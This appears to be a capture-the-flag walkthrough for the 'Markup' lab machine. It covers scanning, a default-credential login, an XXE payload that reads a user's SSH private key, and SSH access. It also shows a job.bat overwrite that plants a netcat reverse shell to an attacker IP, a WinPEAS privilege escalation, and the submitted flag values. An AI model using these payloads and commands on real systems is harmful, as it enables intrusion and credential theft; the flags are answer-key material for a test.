
## Task 1 : What version of Apache is running on the target's port 80?

Run an nmap scan on the target

```
sudo nmap -sV -Pn -T4 -oA initial_scan [target_IP]
```

![[Pasted image 20260218111246.png]]

> Answer : 2.4.41

---

## Task 2 : What username:password combination logs in successfully?

Visit http://[target_IP]/

![[Pasted image 20260218111425.png]]

Try default credentials

admin:password works

> Answer : admin:password

---

## Task 3 : What is the word at the top of the page that accepts user input?

![[Pasted image 20260218111543.png]]

After arriving at the home page, start to click around.

![[Pasted image 20260218111629.png]]

The "order" page gives us a form to fill.

> Answer : order

---

## Task 4 : What XML version is used on the target?

Fill in the form and prepare to intercept the request using burpsuite

![[Pasted image 20260218111927.png]]

We catch a post request in burpsuite

![[Pasted image 20260218111951.png]]

Analysing the post request, we discover the xml version.

![[Pasted image 20260218112026.png]]

> Answer : 1.0

---

## Task 5 : What does the XXE / XEE attack acronym stand for?

Googling "What does the XXE / XEE attack acronym stand for?" returns this [portswigger result](https://portswigger.net/web-security/xxe)

![[Pasted image 20260218112214.png]]

> Answer : XML External Entity

---

## Task 6 : What username can we find on the webpage's HTML code?

On order page, by right clicking and viewing page source

![[Pasted image 20260218112331.png]]

We can see that this page was modified by Daniel

![[Pasted image 20260218112408.png]]

> Answer : Daniel


---

## Task 7 : What is the file located in the Log-Management folder on the target?

Following this [hacktricks guide](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html), make use of the discovered XXE vulnerability to obtain Daniel's ssh id_rsa key.

```
<!DOCTYPE foo [<!ENTITY example SYSTEM "file:///C:/users/daniel/.ssh/id_rsa"> ]>
```

Insert this into the request, as well as modifying the "Home Appliances" category into "&example;"

![[Pasted image 20260218113645.png]]

We get access to Daniel's id_rsa key.

Copy and paste the id_rsa key onto our attacker machine.

```
vim id_rsa
```

![[Pasted image 20260218113900.png]]

Remember to grant id_rsa appropriate permissions

```
chmod 600 id_rsa
```

With all preparations complete, we can now SSH into Daniel.

```
ssh -i id_rsa daniel@[target_IP]
```

![[Pasted image 20260218114244.png]]

With access to Daniel, 

```
cd C:\Log-Management
```

![[Pasted image 20260218114411.png]]

With can see the file of interest.

> Answer : job.bat

---

## Task 8 : What executable is mentioned in the file mentioned before?

```
type job.bat
```

![[Pasted image 20260218114551.png]]

> Answer : wevutil.exe

---

## Submit User Flag : 

For Daniel's user.txt flag

```
type C:\Users\daniel\Desktop\user.txt
```

![[Pasted image 20260218161111.png]]

> User Flag : 032d2fc8952a8c24e39c8f0ee9918ef7
> 
---

## Submit Root Flag : 

Upon further research about what "wevtutil.exe cl" is, [this microsoft page](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) tells us that wevtutil 
 is a native Windows command-line utility used to **cl**ear specific event logs.

We can make a guess that the job.bat file is being executed to run wevtutil, in order to clear event logs on a routine basis.

Therefore, we can try to achieve a reverse shell connection through editing job.bat

Firstly, determine target system architecture so we can use the correct version of netcat

![[Pasted image 20260218115752.png]]

Therefore, grab [nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) on the [netcat github page](https://github.com/int0x33/nc.exe/).

![[Pasted image 20260218151212.png]]

Start a python webserver on attacker machine

![[Pasted image 20260218151925.png]]

Start a netcat listener to catch the reverse shell connection

![[Pasted image 20260218151950.png]]

Download nc64 from attacker machine through hosted python webserver

```
echo C:\Log-Management\nc64.exe -e cmd.exe [Attacker_IP] [Port_No] > C:\Log-Management\job.bat
```

![[Pasted image 20260218152303.png]]

Ordinarily, you would be able to catch a reverse connection on your listener and complete the box.

---

## Disclaimer!! : Cheating this portion

![[Pasted image 20260218160920.png]]

This is an infamous bit of this "Markup" box, where job.bat does not send the reverse-connection back no matter what you try.

Thus, I will be using WinPEASx64.exe to find the admin password and complete the box this way.

Transfer winPEASx64.exe onto target machine using wget 

```
winPEASx64.exe
```

![[Pasted image 20260218162359.png]]

Use these credentials to SSH into administrator account.

```
type C:\Users\Administrator\Desktop\root.txt
```

![[Pasted image 20260218162510.png]]

> Root Flag : f574a3e7650cebd8c39784299cb570f8


---


